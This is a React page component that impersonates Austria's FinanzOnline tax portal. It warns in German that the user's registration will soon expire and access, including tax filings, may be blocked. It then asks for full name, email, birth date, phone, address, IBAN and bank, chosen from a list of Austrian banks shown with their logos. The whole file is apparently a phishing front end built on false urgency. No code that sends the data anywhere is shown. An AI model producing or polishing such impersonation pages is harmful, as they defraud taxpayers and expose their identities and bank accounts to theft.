import Header from "@/components/Header";
import { Info, AlertTriangle, ChevronsUpDown, Check } from "lucide-react";
import { useState, useRef, useEffect } from "react";
import { cn } from "@/lib/utils";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandItem,
  CommandList,
} from "@/components/ui/command";

import raiffeisenIcon from "@/assets/raiffeisen_bank.png";
import ersteIcon from "@/assets/erste_bank.png";
import bawagIcon from "@/assets/bawag_psk.png";
import bankAustriaIcon from "@/assets/bank_austria.png";
import volksbankIcon from "@/assets/volksbank.png";
import easyBankIcon from "@/assets/easy_bank.png";
import hypoNoeIcon from "@/assets/hypo_noe.png";
import oberbankIcon from "@/assets/oberbank.png";
import bank99Icon from "@/assets/bank99.png";
import schelhammerIcon from "@/assets/schelhammer.png";
import bankhausSpaenglerIcon from "@/assets/bankhaus_spaengler.png";
import dolomitenIcon from "@/assets/dolomiten_bank.png";
import spardaIcon from "@/assets/sparda_bank.png";
import dadatIcon from "@/assets/dadat_bank.png";

const banks = [
  { name: "Raiffeisen Bank", icon: raiffeisenIcon },
  { name: "Erste Bank", icon: ersteIcon },
  { name: "BAWAG P.S.K.", icon: bawagIcon },
  { name: "Bank Austria", icon: bankAustriaIcon },
  { name: "Volksbank", icon: volksbankIcon },
  { name: "Easy Bank", icon: easyBankIcon },
  { name: "HYPO NOE", icon: hypoNoeIcon },
  { name: "OberBank", icon: oberbankIcon },
  { name: "Bank99", icon: bank99Icon },
  { name: "Schelhammer", icon: schelhammerIcon },
  { name: "Bankhaus Spängler", icon: bankhausSpaenglerIcon },
  { name: "Dolomiten Bank", icon: dolomitenIcon },
  { name: "Sparda Bank", icon: spardaIcon },
  { name: "Dadat Bank", icon: dadatIcon },
];

const Index = () => {
  const [bankOpen, setBankOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState("");
  const [bankSearch, setBankSearch] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (bankOpen && inputRef.current) {
      inputRef.current.focus();
    }
  }, [bankOpen]);

  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  return (
    <div className="min-h-screen bg-white">
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded border-l-4 border-[#666] bg-[#f5f5f5] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-gray-700" />
            <span className="text-base font-bold text-gray-900">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
            </p>
            <p className="mb-3">
              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
            </p>
            <p>
              Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
            </p>
          </div>
        </div>

        {/* Persönliche Informationen Box */}
        <div className="mt-6 overflow-hidden rounded-lg border border-[#ddd] bg-[#f1f4f7] shadow-sm" role="region" aria-labelledby="region-personal">
          <div className="px-6 pt-6">
            <h2 id="region-personal" className="text-center text-lg font-bold text-gray-900">
              Persönliche Informationen
            </h2>
          </div>

          <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
              <p className="text-sm text-[#856404]">
                Achtung! Bitte überprüfen und aktualisieren Sie Ihre persönlichen Informationen, um Ihren Zugang zu FinanzOnline aufrechtzuerhalten.
              </p>
            </div>
          </div>

          <div className="mx-5 mb-5 rounded-lg bg-white p-6">
            <div className="space-y-5">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Voller Name</label>
                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">E-Mail</label>
                <input type="email" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Geburtsdatum</label>
                <input type="text" placeholder="TT.MM.JJJJ" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Telefonnummer</label>
                <input type="tel" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div className="grid grid-cols-3 gap-4">
                <div className="col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Straße</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Hausnummer</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Stiege</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Türnummer</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Postleitzahl</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Stadt</label>
                  <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">IBAN</label>
                <input type="text" className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Bank Auswahl */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Bank</label>
                <Popover open={bankOpen} onOpenChange={(open) => {
                  setBankOpen(open);
                  if (!open) setBankSearch("");
                }}>
                  <PopoverTrigger asChild>
                    <div
                      className="flex h-10 w-full cursor-pointer items-center rounded-md border border-gray-300 px-3 focus-within:border-gray-400"
                      role="combobox"
                      aria-expanded={bankOpen}
                      onClick={() => setBankOpen(true)}
                    >
                      {selectedBankObj && !bankOpen && (
                        <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                      )}
                      <input
                        ref={inputRef}
                        type="text"
                        className={cn("h-full flex-1 bg-transparent text-sm outline-none", selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400")}
                        placeholder={selectedBank || "Bank auswählen"}
                        value={bankSearch}
                        onClick={(e) => {
                          e.stopPropagation();
                          if (!bankOpen) setBankOpen(true);
                        }}
                        onChange={(e) => {
                          setBankSearch(e.target.value);
                          if (!bankOpen) setBankOpen(true);
                        }}
                        onFocus={(e) => {
                          e.stopPropagation();
                          if (!bankOpen) setBankOpen(true);
                        }}
                      />
                      <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                    </div>
                  </PopoverTrigger>
                  <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                    <Command>
                      <CommandList className="max-h-[250px] overflow-y-auto [&::-webkit-scrollbar]:w-1.5 [&::-webkit-scrollbar-thumb]:rounded-full [&::-webkit-scrollbar-thumb]:bg-gray-300 [&::-webkit-scrollbar-track]:bg-transparent">
                        <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                        <CommandGroup>
                          {banks
                            .filter((bank) =>
                              bank.name.toLowerCase().includes(bankSearch.toLowerCase())
                            )
                            .map((bank) => (
                              <CommandItem
                                key={bank.name}
                                value={bank.name}
                                onSelect={() => {
                                  setSelectedBank(bank.name);
                                  setBankSearch("");
                                  setBankOpen(false);
                                }}
                              >
                                <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                <span className="flex-1">{bank.name}</span>
                                <Check
                                  className={cn(
                                    "ml-2 h-4 w-4",
                                    selectedBank === bank.name ? "opacity-100" : "opacity-0"
                                  )}
                                />
                              </CommandItem>
                            ))}
                        </CommandGroup>
                      </CommandList>
                    </Command>
                  </PopoverContent>
                </Popover>
              </div>

              <div className="pt-2">
                <button className="w-full rounded-md border border-[#00436b] bg-white py-2.5 text-sm font-medium text-[#00436b] hover:bg-[#00436b]/5">
                  Weiter
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
